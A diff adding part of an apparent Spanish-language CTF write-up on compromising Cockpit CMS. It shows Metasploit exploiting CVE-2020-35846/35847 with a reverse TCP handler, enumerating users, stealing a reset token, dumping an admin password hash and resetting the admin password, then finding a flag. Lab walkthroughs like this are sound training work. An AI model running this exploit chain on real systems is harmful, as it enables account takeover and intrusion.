@@ -143,3 +143,42 @@ login_req = session.post(url + "/auth/check" , json=login_data)
 What is the path that allow user enumeration?
 /auth/check
 
+Tras probar con un par de payloads, y configuraciones en metasploit, consigo que exploit cambie la contraseña.
+
+msf exploit(multi/http/cockpit_cms_rce) > run
+[*] Started reverse TCP handler on 192.168.131.65:4444 
+[*] Attempting Username Enumeration (CVE-2020-35846)
+[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
+[*] Obtaining reset tokens (CVE-2020-35847)
+[*] Attempting to generate tokens
+[*] Obtaining reset tokens (CVE-2020-35847)
+[+]   Found tokens: ["rp-11ac563691fb9688e5da958e1f63d6b56a91752320623"]
+[*] Checking token: rp-11ac563691fb9688e5da958e1f63d6b56a91752320623
+[*] Obtaining user info
+[*]   user: admin
+[*]   name: Admin
+[*]   email: admin@yourdomain.de
+[*]   active: true
+[*]   group: admin
+[*]   password: $2y$10$ElrvLj4axHacFVbFvlOG.Ob.D.BnqEfBhjga99q8hkXHd/eodWsAm
+[*]   i18n: en
+[*]   _created: 1621655201
+[*]   _modified: 1621655201
+[*]   _id: 60a87ea165343539ee000300
+[*]   _reset_token: rp-11ac563691fb9688e5da958e1f63d6b56a91752320623
+[*]   md5email: a11eea8bf873a483db461bb169beccec
+[+] Changing password to a3kMhYQ4JC
+//A partir de aqui son fallos para conseguir sesion de meterpreter.
+
+Pero ya puedo acceder. admin:a3kMhYQ4JC
+
+Compromise the Content Management System (CMS). What is Skidy's email.
+
+Siguiendo la pregunta. Busco skidy en la barra de búsqueda, lo que me lleva a su perfil.
+En el campo email esta el suyo.
+skidy@try*************
+
+Buscando maneras de acceder a una revshell, en la pestaña finder encuentro el archivo webflag.php.
+
+What is the web flag?
+thm{f1***********************************}
